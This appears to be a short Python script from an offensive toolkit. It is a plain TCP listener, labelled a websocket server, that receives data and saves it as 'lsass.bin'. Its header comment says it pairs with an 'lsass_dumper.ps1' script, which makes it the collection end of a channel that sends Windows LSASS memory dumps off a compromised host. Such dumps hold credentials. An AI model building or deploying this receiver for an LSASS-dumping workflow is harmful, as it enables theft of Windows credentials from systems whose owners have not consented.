### Basic python websocket server, to be used with the lsass_dumper.ps1
import socket


def save_data_to_file(filename, host='0.0.0.0', port=12345):
    """
    Opens a socket, listens for incoming data, and saves it to a file.

    :param filename: Name of the file to save data.
    :param host: Host to bind the socket to (default is '0.0.0.0').
    :param port: Port to listen on (default is 12345).
    """
    try:
        # Create a socket
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.bind((host, port))
        server_socket.listen(1)
        print(f"Listening on {host}:{port}...")

        # Accept a connection
        conn, addr = server_socket.accept()
        print(f"Connection established with {addr}")

        # Open file for writing
        with open(filename, 'wb') as file:
            print(f"Saving data to {filename}...")
            while True:
                # Receive data in chunks
                data = conn.recv(1024)
                if not data:
                    break
                file.write(data)

        print(f"Data saved to {filename}")

    except Exception as e:
        print(f"Error: {e}")

    finally:
        # Close the connection and socket
        conn.close()
        server_socket.close()
        print("Socket closed.")

# Example usage
save_data_to_file("lsass.bin", port=12345)
